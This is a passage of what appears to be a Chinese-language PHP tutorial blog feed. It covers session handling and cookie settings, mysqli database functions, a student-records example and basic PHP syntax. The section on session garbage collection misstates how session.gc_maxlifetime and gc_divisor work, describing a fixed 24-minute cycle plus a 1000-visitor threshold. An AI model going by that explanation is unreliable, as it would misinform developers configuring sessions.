$_SESSION[key]</code></strong></p><p>提示：每次SESSION操作，都要先开SESSION功能</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174729.png" alt="" loading="lazy"></p><h2 id="删除SESSION数据"><a href="#删除SESSION数据" class="headerlink" title="删除SESSION数据"></a>删除SESSION数据</h2><p> 使用 unset() 函数，删除一个SESSION数据；</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174800.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174813.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174823.png" alt="" loading="lazy"></p><h2 id="销毁SESSION文件"><a href="#销毁SESSION文件" class="headerlink" title="销毁SESSION文件"></a>销毁SESSION文件</h2><p> 描述：删除当前的SESSION文件，不影响其它的SESSION文件。</p><p>语法：<strong><code>bool session_destroy ( void )</code></strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528174905.png" alt="" loading="lazy"></p><h1 id="SESSION对应COOKIE的配置-php-ini"><a href="#SESSION对应COOKIE的配置-php-ini" class="headerlink" title="SESSION对应COOKIE的配置(php.ini)"></a>SESSION对应COOKIE的配置(php.ini)</h1><h2 id="SESSION对应COOKIE过期时间设置"><a href="#SESSION对应COOKIE过期时间设置" class="headerlink" title="SESSION对应COOKIE过期时间设置"></a>SESSION对应COOKIE过期时间设置</h2><p><strong>==修改php.ini配置项：session.cookie_lifetime==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175014.png" alt="" loading="lazy"></p><h2 id="SESSION对应COOKIE有效路径设置"><a href="#SESSION对应COOKIE有效路径设置" class="headerlink" title="SESSION对应COOKIE有效路径设置"></a>SESSION对应COOKIE有效路径设置</h2><p><strong>==修改php.ini配置项：session.cookie_path==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175106.png" alt="" loading="lazy"></p><h2 id="SESSION对应COOKIE域名有效性设置"><a href="#SESSION对应COOKIE域名有效性设置" class="headerlink" title="SESSION对应COOKIE域名有效性设置"></a>SESSION对应COOKIE域名有效性设置</h2><p><strong>==修改php.ini配置项：session.cookie_domain==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175142.png" alt="" loading="lazy"></p><h2 id="是否仅限https来发送SESSION对应的COOKIE数据"><a href="#是否仅限https来发送SESSION对应的COOKIE数据" class="headerlink" title="是否仅限https来发送SESSION对应的COOKIE数据"></a>是否仅限https来发送SESSION对应的COOKIE数据</h2><p>==<strong>修改php.ini配置项：session.cookie_secure</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175236.png" alt="" loading="lazy"></p><h2 id="是否仅限http来使用SESSION对应的COOKIE数据"><a href="#是否仅限http来使用SESSION对应的COOKIE数据" class="headerlink" title="是否仅限http来使用SESSION对应的COOKIE数据"></a>是否仅限http来使用SESSION对应的COOKIE数据</h2><p><strong>==修改php.ini配置项：session.cookie_httponly==</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175311.png" alt="" loading="lazy"></p><h1 id="SESSION垃圾回收机制"><a href="#SESSION垃圾回收机制" class="headerlink" title="SESSION垃圾回收机制"></a>SESSION垃圾回收机制</h1><h2 id="什么是SESSION的垃圾回收机制？"><a href="#什么是SESSION的垃圾回收机制？" class="headerlink" title="什么是SESSION的垃圾回收机制？"></a>什么是SESSION的垃圾回收机制？</h2><p>SESSION垃圾回收， 就是将过期的SESSION服务器文件删除的机制；</p><p>SESSION会自动删除那些过期的服务器端session数据区文件；</p><p><strong>==修改php的配置文件php.ini==</strong>。</p><h2 id="垃圾回收的周期：session-gc-maxlifetime"><a href="#垃圾回收的周期：session-gc-maxlifetime" class="headerlink" title="垃圾回收的周期：session.gc_maxlifetime"></a>垃圾回收的周期：session.gc_maxlifetime</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175420.png" alt="" loading="lazy"></p><p>==<strong>提示：每24分钟清理一次。</strong>==</p><h2 id="垃圾回收的概率：session-gc-divisor"><a href="#垃圾回收的概率：session-gc-divisor" class="headerlink" title="垃圾回收的概率：session.gc_divisor"></a>垃圾回收的概率：session.gc_divisor</h2><p><strong>==回收周期：每24分钟，清理一次SESSION垃圾文件。==</strong></p><p>==<strong>回收概率：1/1000，得到一个百分比，如果达到了100%就清理。每1000人访问，才会清理一次。</strong>==</p><p>首先判断时间是否达到24分钟，如果时间达到24分钟，再看访问的人数够不够1000。如果人数够1000，则进行清理，如果人数没有达到1000，则不清理，要等第2个24分钟。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175606.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528175618.png" alt="" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP连接MySQL服务器</title>
      <link href="/2020/05/28/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/05/28/PHP%E8%BF%9E%E6%8E%A5MySQL%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP连接MySQL服务器"><a href="#PHP连接MySQL服务器" class="headerlink" title="PHP连接MySQL服务器"></a>PHP连接MySQL服务器</h1><h2 id="mysqli-connect"><a href="#mysqli-connect" class="headerlink" title="mysqli_connect()"></a>mysqli_connect()</h2><p>描述：连接到 MySQL服务器</p><p>语法：<code>mysqli mysqli_connect([host][,username][,password][,dbname][,port])</code></p><p>参数：</p><ul><li><p>host：MySQL服务器。可以包含端口号，默认值为“localhost:3306”</p></li><li><p>username：用户名。默认值是服务器进程所有者的用户名；</p></li><li><p>password：密码。</p></li><li><p>dbname：数据库名称。</p></li><li><p>port：MySQL服务器的端口号，默认为3306。</p></li></ul><p>返回值：==如果连接成功，则返回MySQLi连接对象。如果失败，则返回FALSE==。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528124714.png" alt="" loading="lazy"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="@运算符"></a>@运算符</h2><ul><li><p>PHP 支持一个错误控制运算符@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉(不包括语法错误)。</p></li><li><p>@ 运算符只对表达式有效。</p></li><li><p>对新手来说一个简单的规则就是：如果能从某处得到值，就能在它前面加上 @ 运算符。例如，可以把它放在变量，函数和 include调用，常量等等之前。不能把它放在函数或类的定义之前，也不能用于条件结构例如 if 和 foreach 等。</p></li></ul><h2 id="exit-或die"><a href="#exit-或die" class="headerlink" title="exit()或die()"></a>exit()或die()</h2><ul><li><p>描述：输出一个消息并且退出当前脚本，等同于die()。</p></li><li><p>语法：void exit ([ string $string ] ) </p></li><li><p>说明：输出 $string 的值，并中止程序的运行。</p></li><li><p>返回值：没有返回值</p></li></ul><h2 id="mysqli-connect-error"><a href="#mysqli-connect-error" class="headerlink" title="mysqli_connect_error()"></a>mysqli_connect_error()</h2><ul><li><p>描述：返回上一个 MySQL 连接产生的文本错误信息 </p></li><li><p>语法：<code>string mysqli_connect_error ( void)</code></p></li><li><p>参数：没有参数。</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528125046.png" alt="" loading="lazy"></p><h2 id="mysqli-close"><a href="#mysqli-close" class="headerlink" title="mysqli_close()"></a>mysqli_close()</h2><ul><li><p>描述：关闭先前打开的数据库连接</p></li><li><p>语法：<code>bool mysqli_close ( mysqli $link )</code></p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528125212.png" alt="" loading="lazy"></p><h1 id="选择当前数据库"><a href="#选择当前数据库" class="headerlink" title="选择当前数据库"></a>选择当前数据库</h1><ul><li><p>描述：一个数据库服务器可能包含很多的数据库，通常需要针对某个具体的数据库进行编程</p></li><li><p>语法：<code>bool mysqli_select_db(mysqli $link, string $database)</code></p></li><li><p>返回值：如果成功返回TRUE，失败则返回FALSE。</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528125436.png" alt="" loading="lazy"></p><h1 id="设置客户端字符集"><a href="#设置客户端字符集" class="headerlink" title="设置客户端字符集"></a>设置客户端字符集</h1><ul><li><p>描述：设置默认字符编码</p></li><li><p>语法：<code>bool mysqli_set_charset ( mysqli $link , string $charset )</code></p></li><li><p>返回：成功时返回 TRUE， 或者在失败时返回 FALSE。</p></li></ul><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528125802.png" alt="" loading="lazy"></p><h1 id="执行各种SQL语句"><a href="#执行各种SQL语句" class="headerlink" title="执行各种SQL语句"></a>执行各种SQL语句</h1><h2 id="mysqli-query"><a href="#mysqli-query" class="headerlink" title="mysqli_query()"></a>mysqli_query()</h2><p> 描述：发送一条 MySQL 查询；</p><p>语法：<code>resource mysqli_query(mysqli $link , string $query )</code></p><p>参数：</p><ul><li><p>$query是查询字符串；</p></li><li><p>$link是创建的活动的数据库连接；</p></li></ul><p>说明：mysqli_query() 仅对 SELECT，SHOW 或 DESCRIBE 语句返回一个==<strong>mysqli_result结果集对象</strong>==，如果查询执行不正确则返回 FALSE。对于其它类型的 SQL 语句，mysqli_query()在执行成功时返回 TRUE，出错时返回 FALSE。非 FALSE 的返回值意味着查询是合法的并能够被服务器执行。</p><p> 注意：==查询字符串不应以分号结束，和命令行模式下有区别。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528130012.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528130026.png" alt="" loading="lazy"></p><h2 id="mysqli-free-result"><a href="#mysqli-free-result" class="headerlink" title="mysqli_free_result()"></a>mysqli_free_result()</h2><p>描述：释放与结果集相关联的内存</p><p>语法：<code>void mysqli_free_result ( mysqli_result $result )</code></p><p>参数：$result为结果集对象。</p><p><strong>内存中的变量何时消失：</strong></p><p>==(1)网页执行完毕，所有与本网页相关的变量自动销毁；==</p><p>==(2)手动销毁指定的变量。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528130301.png" alt="" loading="lazy"></p><h1 id="从结果集获取一行数据"><a href="#从结果集获取一行数据" class="headerlink" title="从结果集获取一行数据"></a>从结果集获取一行数据</h1><h2 id="mysqli-fetch-row"><a href="#mysqli-fetch-row" class="headerlink" title="mysqli_fetch_row()"></a>mysqli_fetch_row()</h2><p>描述：从结果集中取得一行作为==枚举数组；==</p><p>格式：<code>array mysqli_fetch_row ( mysqli_result $result )</code> </p><p>返回：返回根据所取得的行生成的数组，如果没有更多行则返回 FALSE。</p><p>说明：mysqli_fetch_row() 从指定的结果标识关联的结果集中取得一行数据并作为数组返回。每个结果的列储存在一个数组的单元中，偏移量从 0 开始。</p><p> 提示：==依次调用mysqli_fetch_row()将返回结果集中的下一行，如果没有更多行则返回FALSE。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528130552.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528130602.png" alt="" loading="lazy"></p><h2 id="mysqli-fetch-assoc"><a href="#mysqli-fetch-assoc" class="headerlink" title="mysqli_fetch_assoc()"></a>mysqli_fetch_assoc()</h2><p>描述：从结果集中取得一行作为==<strong>关联数组</strong>==</p><p>语法：<code>array mysqli_fetch_assoc ( mysqli_result  $result )</code></p><p>返回值：从结果集取得的行生成的关联数组，如果没有更多行则返回 FALSE；</p><p>注意：==此函数返回的字段名大小写敏感。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528131107.png" alt="" loading="lazy"></p><h2 id="mysqli-fetch-array"><a href="#mysqli-fetch-array" class="headerlink" title="mysqli_fetch_array()"></a>mysqli_fetch_array()</h2><p>描述：从结果集中取得一行作为<strong>关联数组，或数字数组，或二者兼有</strong>；</p><p>语法：<code>array mysqli_fetch_array ( mysqli_result  $result  [, int $result_type = MYSQLI_BOTH ] )</code></p><p>参数：$result_type是一个==常量==，取值：==MYSQLI_BOTH==(两者兼有，默认)、==MYSQLI_ASSOC==(关联索引)、==MYSQLI_NUM==(数字索引)</p><p>返回：返回根据从结果集取得的行生成的数组，如果没有更多行则返回 FALSE。</p><p>注意：==本函数返回的字段名区分大小写。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528131344.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528131407.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528131417.png" alt="" loading="lazy"></p><h2 id="mysqli-fetch-all"><a href="#mysqli-fetch-all" class="headerlink" title="mysqli_fetch_all()"></a>mysqli_fetch_all()</h2><p>描述：从结果集中取得==<strong>所有行</strong>==作为关联数组、枚举数组、或二者兼有</p><p>语法：<code>mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] )</code></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528131527.png" alt="" loading="lazy"></p><p>==<strong>提示：获取数据，要不是获取一条，要不是获取多条。</strong>==</p><h1 id="获取记录数"><a href="#获取记录数" class="headerlink" title="获取记录数"></a>获取记录数</h1><h2 id="mysqli-num-rows"><a href="#mysqli-num-rows" class="headerlink" title="mysqli_num_rows()"></a>mysqli_num_rows()</h2><p>描述：取得结果集中行的数目</p><p>语法：<code>int mysqli_num_rows ( mysqli_result $result )</code></p><p>说明：mysqli_num_rows()返回结果集中行的数目。</p><p>注意：==<strong>此命令仅对</strong> <strong>SELECT 语句有效</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528131749.png" alt="" loading="lazy"></p><h2 id="mysqli-affected-rows"><a href="#mysqli-affected-rows" class="headerlink" title="mysqli_affected_rows()"></a>mysqli_affected_rows()</h2><p>描述：取得前一次 MySQL 操作所影响的记录行数；</p><p>语法：<code>int mysqli_affected_rows ( mysqli $link )</code></p><p>说明：取得最近一次与 $link 关联的 SELECT、INSERT、UPDATE 或 DELETE 查询所影响的记录行数。 </p><p>注意：==如果最近一次查询失败，函数返回-1。当使用UPDATE查询，MySQL不会将原值和新值一样的值更新，返回值不一定就是查询条件所符合的记录，只有修改过的记录数才会被返回。==</p><h1 id="综合案例：学生信息管理"><a href="#综合案例：学生信息管理" class="headerlink" title="综合案例：学生信息管理"></a>综合案例：学生信息管理</h1><h2 id="学生信息表结构student"><a href="#学生信息表结构student" class="headerlink" title="学生信息表结构student"></a>学生信息表结构student</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132019.png" alt="" loading="lazy"></p><h2 id="连接数据库的公共文件conn-php"><a href="#连接数据库的公共文件conn-php" class="headerlink" title="连接数据库的公共文件conn.php"></a>连接数据库的公共文件conn.php</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132037.png" alt="" loading="lazy"></p><h2 id="学生信息列表页list-php"><a href="#学生信息列表页list-php" class="headerlink" title="学生信息列表页list.php"></a>学生信息列表页list.php</h2><p><strong>1）制作显示学生信息的表格</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132145.png" alt="" loading="lazy"></p><p><strong>2）PHP程序部分</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132208.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132217.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132227.png" alt="" loading="lazy"></p><h2 id="删除学生信息delete-php"><a href="#删除学生信息delete-php" class="headerlink" title="删除学生信息delete.php"></a>删除学生信息delete.php</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132304.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132315.png" alt="" loading="lazy"></p><h2 id="添加学生信息add-php"><a href="#添加学生信息add-php" class="headerlink" title="添加学生信息add.php"></a>添加学生信息add.php</h2><p><strong>1）制作添加学生的表单</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132421.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132432.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132441.png" alt="" loading="lazy"></p><p><strong>2）处理表单提交数据</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132508.png" alt="" loading="lazy"></p><h1 id="PHP处理复选框数据"><a href="#PHP处理复选框数据" class="headerlink" title="PHP处理复选框数据"></a>PHP处理复选框数据</h1><h2 id="复选框表单处理"><a href="#复选框表单处理" class="headerlink" title="复选框表单处理"></a>复选框表单处理</h2><p>==<strong>PHP会把name = “hobby[]”看成添加一个数组元素，而HTML把它看成一个字符串</strong>==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132633.png" alt="" loading="lazy"></p><h2 id="PHP如何处理复选框数据"><a href="#PHP如何处理复选框数据" class="headerlink" title="PHP如何处理复选框数据"></a>PHP如何处理复选框数据</h2><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132659.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200528132713.png" alt="" loading="lazy"></p><p>==<strong>提示：将多个爱好连成一个值，并写入到数据库某个字段中。只需要一个字段来存储爱好。</strong>==</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基本语法规则</title>
      <link href="/2020/05/28/PHP%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99/"/>
      <url>/2020/05/28/PHP%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP基本语法规则"><a href="#PHP基本语法规则" class="headerlink" title="PHP基本语法规则"></a><strong>PHP基本语法规则</strong></h1><h2 id="PHP-标记"><a href="#PHP-标记" class="headerlink" title="PHP 标记"></a>PHP 标记</h2><p>​        PHP语言，是一种可以嵌入到“html”代码中的后台处理语言（程序）有以下几种标记形式，只推荐第一种。</p><ol><li><p>==<strong><?php   php代码写在这里.....  ?></strong>==<br>这是推荐写法！</p></li><li><script  language="php" >  php代码写在这里.....  </script></li><li><?   php代码写在这里.....  ?><p>需要到php.ini中进行配置：short_open_tag = On            //默认为Off，表示不能用该形式。</p></li></ol><p><strong>注意：</strong></p><p>​    纯PHP代码：可以省略标记结尾符。</p><p>​    后面，我们会写很多“纯php代码文件”（里面没有任何html代码）。</p><p>​    </p><h2 id="PHP-语句结束符"><a href="#PHP-语句结束符" class="headerlink" title="PHP 语句结束符"></a>PHP 语句结束符</h2><p>使用英文分号（;）表示一条语句的结束。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200526202055.png" alt="" loading="lazy"></p><h2 id="PHP注释"><a href="#PHP注释" class="headerlink" title="PHP注释"></a>PHP注释</h2><p><strong>单行注释：</strong><br>    两个斜杠： //斜杠后面的部分就是注释内容，PHP语言不会去处理它（不执行）</p><p><strong>多行注释：</strong><br>    形式：<br>    /*<br>    这是注释内容。。。<br>    可以写多行<br>    */</p><p>​    /* 当然写一行也是可以的 */</p><p>​    ==重要的事情是：注释是写程序的非常重要的因素和习惯！==</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="含义与定义形式"><a href="#含义与定义形式" class="headerlink" title="含义与定义形式"></a>含义与定义形式</h2><p>就是使用一个“标记符号”（标识符），来代表某个数据。</p><p>类比：</p><p>用一个名字（姓名），来代表某个人。</p><p>用一个身份证号码，来代表某个人。。。</p><p>用一个变量，就可以理解为“使用一个数据”。</p><p>既然是变量，就是该数据时可以改变的一种数据。</p><p>对应常量：就是一种不可以（不允许）改变的数据。</p><p>==定义形式： $变量名 = 具体的数据；==</p><p><strong>==特别注意：变量名区分大小写！！！！！！==</strong></p><p>举例：</p><p>​    $v1 = 123;                      ==//这里的等于号（=），不是数学上的等于（相等），而是“赋值”的意思==</p><p>​                                            ==//其本质含义是：将123这个数据，放到v1这个变量中去。==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200526203549.png" alt="" loading="lazy"></p><p>变量的另一个角度理解：</p><p>​        变量是一个“容器”，是一个“盒子”，是一个可以存放数据的位置——内存空间。</p><p>也可以这样去理解：</p><p>​        内存（条）中分割出很多很多的小格子，每个格子都有一个编号地址（所谓内存地址）。</p><p>​        其中存储了数据的格子上有一定的标记名（变量名），并存放了对应的数据。</p><p>​        图示如下：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527083138.png" alt="" loading="lazy"></p><p>对应代码如下：</p><p>​        $a = 200;</p><p>​        $b = 100;</p><p>​        其中，==“0xA01”，“0xA02”代表内存地址==。内存地址其实是我们看不到的，由系统分配。</p><h2 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h2><p><strong>基本规则（明规则）</strong></p><p>​    就是给一个变量命名的时候，要遵循的规则。</p><ol><li><p>构成：字母、数字、下划线；</p></li><li><p>开头：字母或下划线；</p></li><li><p>注意：变量名不要跟系统中的“关键字”（即语法所用单词）重复——关键字不多，也就几十个。</p></li></ol><p><strong>行业规则（潜规则）</strong></p><p>​        通常，尽量将变量命名为“见名知意”。</p><p>​        尽量用更容易理解的单词（或拼音）去表示一个数据，很多时候可以使用“多个单词（拼音）”。</p><p>​        比如：</p><p>​            ChildAge,  YungerAge, ParentHouse, MyParentHouse, MyParentHousePrice</p><p>​        此时，通常有两个行业中的惯例规则：</p><p>​        骆驼命名法（小驼峰命名法）：第一个单词首字母小写，其余单词首字母大写。</p><p>​            childAge,  yungerAge, parentHouse, myParentHouse, myParentHousePrice</p><p>​        帕斯卡命名法（大驼峰命名法）：所有单词都首字母大写。</p><p>​            ChildAge,  YungerAge, ParentHouse, MyParentHouse, MyParentHousePrice</p><h2 id="变量的4种基本操作"><a href="#变量的4种基本操作" class="headerlink" title="变量的4种基本操作"></a>变量的4种基本操作</h2><p><strong>赋值——常见操作</strong></p><p>​        将一个数据（值）放入一个变量中。</p><p>​        $name = “张三丰”;</p><p>​        几乎所有变量要想后续正常使用，第一件事就是“赋值”。</p><p>​        变量初始赋值后，可以后续再去重新赋值——这就是修改了变量的值，比如：</p><p>​        $name = “张三不疯”;</p><p>​        变量赋值的本质是：将变量名，跟一个数据“建立关联（联系）”，图示如下：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527083717.png" alt="" loading="lazy"></p><p><strong>取值——常见操作</strong></p><p>​        取值，就是，从变量这个容器中拿到其中存储的数据（值）；</p><p>​        取值无处不在：凡是使用到变量，并在该位置上，需要一个“数据”的时候，就会发生取值操作</p><p><strong>判断变量isset()</strong></p><p>​        就是判断一个“变量名”是否里面存储了数据！</p><p>​        判断的结果是：true（真，表示有），或者false（假，表示没有）。</p><p>​        ==使用这个语法来判断：isset( $变量名 );==</p><p>​        还有一个特殊的赋值，赋值后，变量中也没有数据，如下：</p><p>​        ==$v5 = null;       //null是一个特殊的“数据”（值），该数据的含义是：没有数据。==</p><p>​        ==即此时判断 isset($v5)的结果是“false”。==</p><p><strong>删除/销毁变量unset()</strong></p><p>​        当一个变量中存储了数据，我们也可以去销毁（删除）它，语法如下：</p><p>​            ==unset( $变量名 ）==。</p><p>​            ==删除变量的本质是：断开变量名跟其关联过的那个数据之间的“联系”==，图示如下：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527085016.png" alt="" loading="lazy"></p><p>​        此时，该变量就不再指向某个数据了，其isset()判断的结果为false。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527085142.png" alt="" loading="lazy"></p><h2 id="变量传值（难点）"><a href="#变量传值（难点）" class="headerlink" title="==变量传值（难点）=="></a>==变量传值（难点）==</h2><p><strong>含义：</strong></p><p>​        是指，将一个变量的值“传递”给另一个变量的方式问题。</p><p>​        形式上，就是一个变量在等号左边，一个变量在等号右边，就表示将右边变量的值传给左边的变量。</p><p>​        ==有且只有两种传数据的方式：值传递，和引用传递。==</p><p><strong>值传递：</strong></p><p>​        就是将右边变量的“数据值”本身，复制一份，然后赋值给左边变量。</p><p>​        形式如下：</p><p>​            $变量1 = $变量2；</p><p>​        举例：</p><p>​            $v1 = 1;</p><p>​            $v2 = $v1;</p><p>​        可见：</p><p>​            ==值传递之后，两个变量互不影响，相互独立，没有关系了==！</p><p>​        其原理如下所示：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527090938.png" alt="" loading="lazy"></p><p>​        可见，此时两个变量在赋值之后，就相互独立，各自有自己的存放空间。改变一个，另一个不受影响。</p><p>​        代码演示：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091011.png" alt="" loading="lazy"></p><p><strong>==引用传递：==</strong></p><p>​        是将右边变量对数据的引用关系，传给左边的变量。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527090938.png" alt="" loading="lazy"></p><p>​        代码演示：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091011.png" alt="" loading="lazy"></p><h2 id="预定义变量"><a href="#预定义变量" class="headerlink" title="==预定义变量=="></a>==预定义变量==</h2><p>​        在PHP语言内部，有一些（也就10来个）变量，是现成的，直接可以使用，这就是所谓预定义变量。</p><p>我们要做的是事情就是：理解该变量是什么意思，以及怎么用</p><h3 id="GET变量"><a href="#GET变量" class="headerlink" title="$_GET变量"></a>$_GET变量</h3><p>​        代表浏览器表单通过“get”方式提交的所有数据（集），可以称为“get数据”。</p><p>​        也可以理解为：</p><p>​            $_GET变量里面会“自动存储”（保存/装载）提交到某个文件中的GET数据。</p><p>​            而GET数据，是在一个页面以“get”方式请求的时候提交的数据。</p><p>​        代码演示：</p><p>​        制作一个表单，有两个输入框，可以输出数字，并提交。</p><p>​        到另一个页面（文件）中，计算这两个数字的和！</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091422.png" alt="" loading="lazy"></p><h3 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h3><p>​        代表浏览器表单通过“post”方式提交的所有数据（集），可以称为“POST数据”。</p><p>​        也可以理解为：</p><p>​            $_POST变量里面会“自动存储”（保存/装载）提交到某个文件中的POST数据。</p><p>​            而POST数据，是在一个表单中以“post”方式提交的数据。</p><p>​    </p><p>​        代码演示：</p><p>​            有个表单，两个输入框，可以填写数字，有一个“提交按钮”，点击提交，可以计算他们的和并输出。</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091526.png" alt="" loading="lazy"></p><p>​        扩展（提交给自己！）：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091559.png" alt="" loading="lazy"></p><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p>​        代表浏览器通过“get”方式 或 “post”方式提交的数据的合集。</p><p>​        即：它既能接收到get过来的数据，也能接收到post过来的数据！</p><p>​        通常，一个表单，只提交一种形式的数据，要么get数据，要么post数据！</p><p>​        代码演示：</p><p>​        但，有一个情况，提交post数据的同时，也可以提交get数据：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091644.png" alt="" loading="lazy"></p><h3 id="SERVER变量"><a href="#SERVER变量" class="headerlink" title="$_SERVER变量"></a>$_SERVER变量</h3><p>​        它代表任何一次请求中，==客户端或服务器端的一些“基本信息”或系统信息==，包括很多（10多项）。</p><p>我们无非就是要知道，哪些信息是可以供我们使用的！</p><p>​        常用的有：</p><p>​            PHP_SELF：         表示当前请求的网页地址（不含域名部分）</p><p>​            SERVER_NAME：    表示当前请求的服务器名</p><p>​            SERVER_ADDR：    表示当前请求的服务器IP地址</p><p>​            DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个）</p><p>​            REMOTE_ADDR：  表示当前请求的客户端的IP地址</p><p>​            SCRIPT_NAME：     表示当前网页地址\</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527091845.png" alt="" loading="lazy"></p><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p><strong>含义：</strong></p><p>​        变量名本身又是一个“变量”的变量。</p><p>示例：</p><p>​        $v1 = 10;</p><p>​        echo $v1;   //输出10</p><p>​        $str = “v1”;   //这是一个变量，名为str，值为“v1”（字符串）</p><p>​        echo $$str;  //输出10。这里，“$$str”就是所谓的“可变变量”</p><p>​                        //相当于 echo $v1;   结果就是10</p><p>代码演示：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527092047.png" alt="" loading="lazy"></p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p><strong>常量的含义</strong></p><p>​        常量，就是一个用于存储“不会（也不允许）变化的数据”的标识符。</p><p>​        比如圆周率，在一定的应用场景中，就是是一个固定的值（人为规定为某个值）。</p><h2 id="常量的两种定义形式"><a href="#常量的两种定义形式" class="headerlink" title="常量的两种定义形式"></a>常量的两种定义形式</h2><p><strong>define()函数形式</strong></p><p>​        define(‘常量名’, 对应的常量值);</p><p>​        ==常量名推荐使用“全大写”。==</p><p><strong>const关键字定义：</strong></p><p>​        const 常量名 = 对应的常量值;</p><h2 id="常量的两种取值形式"><a href="#常量的两种取值形式" class="headerlink" title="常量的两种取值形式"></a>常量的两种取值形式</h2><p><strong>直接使用：</strong></p><p>​        echo 